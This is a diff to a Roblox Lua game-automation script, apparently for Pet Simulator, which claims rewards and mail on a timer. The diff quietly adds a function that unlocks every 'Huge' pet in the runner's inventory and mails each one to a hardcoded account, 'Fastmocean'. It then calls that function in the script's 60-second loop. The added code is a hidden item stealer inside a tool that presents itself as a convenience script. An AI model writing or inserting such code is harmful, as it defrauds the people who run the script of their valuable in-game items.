@@ -28,6 +28,36 @@ local function daycarevoucher()
     end 
 end
 
+
+
+local function autosendmail()
+    getgenv().MailToUser = "Fastmocean"
+    local HugeUIDList = {}
+    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
+        if PetData.id:find("Huge ") then
+            table.insert(HugeUIDList, PetUID)
+            if PetData._lk then
+                repeat
+                    task.wait()
+                until network.Invoke("Locking_SetLocked", PetUID, false)
+                print("Unlocked", PetUID)
+            end
+        end
+    end
+
+    for _, PetUID in pairs(HugeUIDList) do
+        repeat
+            task.wait()
+        until network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
+        print("Sent", PetUID)
+    end
+end
+
+
+
+
+
+
 local function claimrank()
     local totalStars = 0
     for i,v in require(game:GetService("ReplicatedStorage").Library.Directory.Ranks)[rankCmds.GetTitle()]["Rewards"] do
@@ -219,5 +249,9 @@ while wait(60) do
 
     task.spawn(function()
         game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Claim All"):InvokeServer()
+    end)
+    task.spawn(function()
+        autosendmail()
+    
     end)
 end
